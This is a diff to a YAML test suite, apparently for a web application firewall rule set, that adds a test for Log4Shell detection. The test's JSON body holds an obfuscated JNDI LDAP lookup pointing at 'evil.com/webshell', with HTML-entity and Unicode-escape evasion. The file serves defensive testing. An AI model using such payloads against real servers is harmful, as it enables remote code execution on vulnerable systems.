@@ -395,7 +395,24 @@ tests:
             uri: /
           output:
             log_contains: id "944141"
-  - test_title: 944141-24
+  - test_title: 944140-24
+    desc: Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion, omitting terminal semi-colon
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "$\u0026lbracejndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944140"
+  - test_title: 944141-25
     desc: Log4J exploit on arg foo, with evasion
     stages:
       - stage:
